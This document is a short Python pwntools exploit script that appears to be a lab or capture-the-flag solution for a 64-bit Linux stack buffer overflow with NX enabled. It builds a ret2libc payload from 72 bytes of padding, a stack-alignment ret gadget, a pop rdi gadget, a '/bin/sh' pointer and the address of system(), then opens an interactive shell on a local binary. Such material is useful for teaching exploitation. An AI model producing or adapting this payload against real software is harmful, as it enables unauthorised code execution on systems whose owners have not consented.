#!/usr/bin/env python3
# Linux Buffer Overflow 64 bits NX Enabled

# Checksec

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# /proc/sys/kernel/randomize_va_space 0

from pwn import *

p = process('./pwn')

libc_base = 0x7ffff79e2000
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a

POP_RDI = 0x4007f3

payload = b'A' * 72
payload += p64(0x400556)    # ret for stack alignment issues Ubuntu, bypass movaps
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline("2")
p.sendline(payload)
p.interactive()
